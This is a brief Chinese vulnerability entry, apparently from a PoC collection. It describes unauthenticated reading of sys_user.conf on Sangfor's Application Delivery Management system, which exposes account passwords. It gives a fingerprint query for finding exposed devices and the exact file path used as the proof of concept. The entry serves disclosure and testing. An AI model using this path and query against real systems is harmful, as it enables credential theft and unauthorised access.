# 深信服 应用交付管理系统 sys_user.conf 账号密码泄漏漏洞

## 漏洞描述

深信服 应用交付管理系统 文件sys_user.conf可在未授权的情况下直接访问，导致账号密码泄漏

## 漏洞影响

<a-checkbox checked>深信服 应用交付管理系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="SANGFOR-应用交付管理系统"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1646105000489-5727976c-4824-4f44-9c53-729cd9410f93.png)

验证POC

```javascript
/tmp/updateme/sinfor/ad/sys/sys_user.conf
```

![img](../../../.vuepress/public/img/1646105017682-f6969569-17c3-4386-aa54-792537cab576.png)